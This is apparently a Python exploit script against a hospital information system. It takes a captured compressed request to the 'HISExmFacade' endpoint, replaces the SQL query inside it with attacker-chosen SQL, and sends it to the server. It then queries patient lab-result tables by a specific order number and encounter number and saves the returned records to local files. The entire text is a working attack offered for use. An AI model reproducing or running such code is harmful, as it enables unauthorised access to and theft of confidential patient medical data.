from his_client_final import HISClient
import requests
import zlib

class LabSearcher3(HISClient):
    def execute_sql(self, sql):
        try:
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()
            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            target_len = len(original_sql_bytes)
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            padded_sql = sql.ljust(target_len)
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

searcher = LabSearcher3()

ordseq = 'A75176986OR0041'
encntno = '75176986'

# 1. Sample PAT_RESULTH with SELECT * (no column filter) to see actual data format
print("1. Sampling PAT_RESULTH (SELECT * ROWNUM<=2)...")
sql1 = "SELECT * FROM OPDUSR.PAT_RESULTH WHERE ROWNUM <= 2"
res1 = searcher.execute_sql(sql1)
if res1 and "<NewDataSet>" in res1:
    with open("sample_pat_resulth.txt", "w", encoding="utf-8") as f:
        f.write(res1)
    print(res1[:1200])
else:
    print("[-] No data or error.")

# 2. Try EXMREPD table (another lab source found earlier)
print("\n2. Searching OPDUSR.EXMREPD for ORDSEQ...")
sql2 = f"SELECT * FROM OPDUSR.EXMREPD WHERE ORDSEQ = '{ordseq}'"
res2 = searcher.execute_sql(sql2)
if res2 and "<NewDataSet>" in res2 and "<DRMODIFY>" in res2:
    print("[+] Found in EXMREPD!")
    with open("exmrepd_ordseq.txt", "w", encoding="utf-8") as f:
        f.write(res2)
    print(res2[:800])
else:
    print("[-] Not found in EXMREPD by ORDSEQ.")

# 3. Try EXMREPD with ENCNTNO
print(f"\n3. Searching OPDUSR.EXMREPD for ENCNTNO {encntno}...")
sql3 = f"SELECT * FROM OPDUSR.EXMREPD WHERE ORDSEQ LIKE '%{encntno}%'"
res3 = searcher.execute_sql(sql3)
if res3 and "<NewDataSet>" in res3 and "<DRMODIFY>" in res3:
    print("[+] Found in EXMREPD by ENCNTNO!")
    with open("exmrepd_encntno.txt", "w", encoding="utf-8") as f:
        f.write(res3)
    print(res3[:800])
else:
    print("[-] Not found in EXMREPD by ENCNTNO.")
